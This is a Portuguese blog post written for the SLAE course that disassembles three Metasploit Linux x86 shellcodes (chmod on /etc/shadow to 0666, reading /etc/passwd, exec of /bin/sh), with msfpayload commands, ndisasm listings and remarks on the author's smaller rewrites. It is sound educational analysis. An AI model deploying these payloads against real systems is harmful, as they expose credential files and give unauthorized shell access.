---
layout: post
title: SLAE - 5th Assignment - Metasploit Shellcodes Analysis
date: '2013-04-20T15:56:00.003-03:00'
author: geyslan
categories: blog
excerpt: ""
tags: [slae, shellcode, linux, code, assembly, hacking, metasploit, portuguese]
share: true
modified: '2013-08-22T11:41:03.312-03:00'
blogger_id: tag:blogger.com,1999:blog-2541885528459487831.post-6393881731251896975
blogger_orig_url: http://www.hackingbits.com/2013/04/slae-5th-assignment-metasploit.html
---

*/\*<br>
Este post é uma sequência. Para melhor entendimento, vejam:<br>
[SLAE - 1st Assignment - Shell Bind TCP](/blog/slae-1st-assignment-shell-bind-tcp)<br>
[Hacking do Dia - Shell Bind TCP Random Port](/blog/hacking-do-dia-shell-bind-tcp-random)<br>
[SLAE - 2nd Assignment - Shell Reverse TCP](/blog/slae-2nd-assignment-shell-reverse-tcp)<br>
[O menor do mundo? Yeah? So Beat the Bits!](/blog/o-menor-do-mundo-yeah-so-beat-bits)<br>
[SLAE - 3rd Assignment - Caçando Ovos?](/blog/slae-3rd-assignment-cacando-ovos)<br>
[SLAE - 4th Assignment - Encoding and Decoding Gollums](/blog/slae-4th-assignment-encoding-and)<br>
\*/*

<!--more-->

*This blog post has been created for completing the requirements of the
SecurityTube Linux Assembly Expert certification:*

*[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)*

*Student ID: SLAE-237*

*Códigos deste post estão no [GitHub](https://github.com/geyslan/SLAE/tree/master/5th.assignment)*.

*Shell-Storm:<br>
[Tiny Execve Sh](http://shell-storm.org/shellcode/files/shellcode-841.php)<br>
[Insertion Decoder Shellcode](http://shell-storm.org/shellcode/files/shellcode-840.php)*

##Missão

Olá! Estou de volta com a quinta missão do curso SLAE.

###5th assignment:

- Dissecar três shellcodes do Metasploit utilizando ndisasm (ou gdb) e libemu.
- Apresentar análise.

##1st - linux/x86/chmod

{% highlight console %}
$ msfpayload linux/x86/chmod S

      Name: Linux Chmod
    Module: payload/linux/x86/chmod
   Version: 0
  Platform: Linux
      Arch: x86
Needs Admin: No
Total size: 143
      Rank: Normal

Provided by:
 kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
 Runs chmod on specified file with specified mode
{% endhighlight %}

A syscall chmod recebe dois argumentos, o primeiro é o caminho ou arquivo a ter
as permissões setadas, e o segundo é o bitmask resultado dos respectivos octais
"ORed".

O payload linux/x86/chmod modifica as permissões de acesso do arquivo
/etc/shadow para 0666.

{% highlight console %}
$ msfpayload linux/x86/chmod R | ndisasm -u -
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call dword 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popad
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

Ele inicia com a instrução [CDQ](http://faydoc.tripod.com/cpu/cdq.htm) no
intento de zerar EDX; aqui, já econtramos uma falha no shellcode do msf. Se
houver lixo em EAX (um número negativo, por exemplo) EDX não será zerado, pois o
CDQ copia o sign bit 31 de EAX para todos os bits de EDX.

{% highlight console %}
00000000  99                cdq
{% endhighlight %}

A segunda instrução coloca o valor 15 ou 0xf em hexa no topo da STACK para
seguidamente ser retirado e inserido em EAX.

{% highlight console %}
00000001  6A0F              push byte +0xf    __NR_chmod
00000003  58                pop eax
{% endhighlight %} [//]: # (__)

Salvando EDX (supostamente 0) na stack.

{% highlight console %}
00000004  52                push edx
{% endhighlight %}

*"Percebi que essa última instrução, se removida, não afeta o shellcode, uma vez
que o nome do arquivo não é inserido na STACK. Serão, então, a CDQ e a PUSH EDX,
tentativas de evasão de IPS/IDS?"*

Agora, o shellcode faz uma CALL para o EIP somado de 22 bytes. Esta call é
utilizada em conjunto com a próxima instrução que retirará o novo endereço de
EIP da STACK e salvará em EBX, onde o nome do arquivo (primeiro argumento da
syscall) está em forma de bytes.

{% highlight console %}
00000005  E80C000000        call dword 0x16  #Mais um problema no payload - NULL bytes
...
00000016  5B                pop ebx
{% endhighlight %}

Vejam que se convertermos os bytes do trecho entre a CALL (byte 5) e o destino
(byte 16) em string, encontraremos o nome do arquivo.

{% highlight console %}
2F                das
657463            gs jz 0x71
2F                das
7368              jnc 0x79
61                popad
646F              fs outsd
7700              ja 0x16
{% endhighlight %}

A string é hardcoded no payload com a terminação NULL (0).

{% highlight console %}
$ python
{% endhighlight %}

{% highlight python %}
>>>  bytes.fromhex("2F6574632F736861646F7700")
b'/etc/shadow\x00'

{% endhighlight %}

No gdb, podemos verificar isso mais facilmente.

{% highlight console %}
(gdb) x/s $ebx
0x804974a <shellcode+10>: "/etc/shadow"

(gdb) x/12bx $ebx
0x804974a <shellcode+10>: 0x2f 0x65 0x74 0x63 0x2f 0x73 0x68 0x61
0x8049752 <shellcode+18>: 0x64 0x6f 0x77 0x00
{% endhighlight %}

Em seguida, é inserido na STACK e retirado com POP ECX o bit mask para uso como
segundo argumento da syscall chmod.

{% highlight console %}
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
{% endhighlight %}

O valor hexa 0x1b6 corresponde ao octal 0666.

{% highlight console %}
$ printf '%o\n' 0x01b6
666
{% endhighlight %}

ou

{% highlight console %}
$ printf '%x\n' 0666 (lembre-se de colocar o zero à esquerda)
0x1b6
{% endhighlight %}

O restante do payload trata de chamar a syscall chmod com a INT 0x80 e fechar o
programa explorado.

{% highlight console %}
0000001D  CD80              int 0x80

0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

O chmod do msf tem 36 bytes. Dele consegui diminuir 2 bytes e ainda evitar
possíveis bytes lixo; vejam abaixo.

{% gist geyslan/5424493 %}

{% include imagehb.html url="https://raw.github.com/geyslan/SLAE/master/5th.assignment/tiny_chmod.png" caption="Fluxograma linux/x86/chmod" %}

##2nd - linux/x86/read_file

{% highlight console %}
$ msfpayload linux/x86/read_file PATH=/etc/passwd S

       Name: Linux Read File
     Module: payload/linux/x86/read_file
    Version:
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 180
       Rank: Normal

Provided by:
  hal

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FD    1                yes       The file descriptor to write output to
PATH  /etc/passwd      yes       The file path to read

Description:
  Read up to 4096 bytes from the local file system and write it back
  out to the specified file descriptor
{% endhighlight %}

O payload read_file faz uso de quatro syscalls: open, read, write e exit. Mais
informações: man 2 syscall.

{% highlight console %}
$ msfpayload linux/x86/read_file PATH=/etc/passwd R | ndisasm -u -
00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  0000              db 0x00
{% endhighlight %}

Encontramos mais uma vez o uso do JMP/CALL/POP para obter o endereço da string
e, neste caso, copiá-lo para EBX.

{% highlight console %}
00000000  EB36              jmp short 0x38
...
00000038  E8C5FFFFFF        call dword 0x2
...
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
{% endhighlight %}

A string se localiza logo abaixo da instrução CALL.

{% highlight console %}
E8C5FFFFFF        call dword 0x2
2F                das
657463            gs jz 0xa4
2F                das
7061              jo 0xa5
7373              jnc 0xb9
7764              ja 0xac
00                db 0x00
{% endhighlight %}

{% highlight console %}
$ python
{% endhighlight %}

{% highlight python %}
>>>  bytes.fromhex("2F6574632F70617373776400")
b'/etc/passwd\x00'

{% endhighlight %}

A continuação do shellcode é de fácil compreensão.

*int open(["/etc/passwd", 0], 0);*

{% highlight console %}
00000002  B805000000        mov eax,0x5    NULL bytes
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
{% endhighlight %}

Após obtermos o retorno de open (file descriptor), continuamos com a syscall
read, que copiará 4096 bytes do file descriptor dentro da STACK.

*ssize_t read(ebx, *esp, 4096);*

{% highlight console %}
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
{% endhighlight %}

Eu realmente não entendi o motivo do payload utilizar EDI, e portanto fazer a
cópia duas vezes do ponteiro de ESP. Pois bastava fazer: mov ecx,esp. Será isso
mais uma tentativa de evasão?

Agora que já temos os dados do arquivo, vamos escrevê-lo no stdout.

*ssize_t write(1, *esp, edx);*

{% highlight console %}
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
{% endhighlight %}

E sair do programa graciosamente.

{% highlight console %}
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
{% endhighlight %}

A versão do msf tem 73 bytes. A minha tem apenas 51 bytes, é à prova de lixo e
livre de null bytes.

{% gist geyslan/5426567 %}

O limite de leitura e escrita de 4096 bytes é uma garantia para não haver
estouro de pilha. Podemos saber qual o limite da STACK utilizando o ulimit.

{% highlight console %}
$ ulimit -a
...
stack size              (kbytes, -s) 8192
...
{% endhighlight %}

E se precisarmos de mais espaço na STACK, podemos aumentar o seu tamanho antes
de a utilizarmos.

{% highlight console %}
$ man 2 setrlimit
...
int setrlimit(int resource, const struct rlimit *rlim);
...
{% endhighlight %} [//]: # (*)

;)

##3rd - linux/x86/exec

{% highlight console %}
$ msfpayload linux/x86/exec S

       Name: Linux Execute Command
     Module: payload/linux/x86/exec
    Version: 0
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 143
       Rank: Normal

Provided by:
  vlad902 <vlad902@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
{% endhighlight %}

{% highlight console %}
$ msfpayload linux/x86/exec CMD=/bin/sh R | ndisasm -u -

00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E808000000        call dword 0x25
0000001D  2F                das
0000001E  62696E            bound ebp,[ecx+0x6e]
00000021  2F                das
00000022  7368              jnc 0x8c
00000024  005753            add [edi+0x53],dl
00000027  89E1              mov ecx,esp
00000029  CD80              int 0x80
{% endhighlight %}

O execve é um velho conhecido nosso, correto? Por isso, deixo esta análise com
vocês. Comparem o assembly do msf com o do [Vivek](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html) e depois com o [Tiny Execve Sh](https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm),
o qual já apresentei em post anterior.

Dúvidas? Críticas!? Comentem. Será um prazer respondê-los.

Até a próxima.

o//

##Mais Informações

[SLAE - SecurityTube Linux Assembly Expert](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)<br>
[Get shellcode of the binary using objdump - Andrey Arapov](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump#comment)<br>
[Demystifying the Execve Shellcode (Stack Method) - Vivek Ramachandran](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html)<br>
[open()](http://linux.die.net/man/2/open)<br>
[read()](http://linux.die.net/man/2/read)<br>
[write()](http://linux.die.net/man/2/write)<br>
[metasploit](http://www.metasploit.com/)<br>
[Metasploit Unleashed - Offensive Security](http://www.offensive-security.com/metasploit-unleashed/Main_Page)<br>
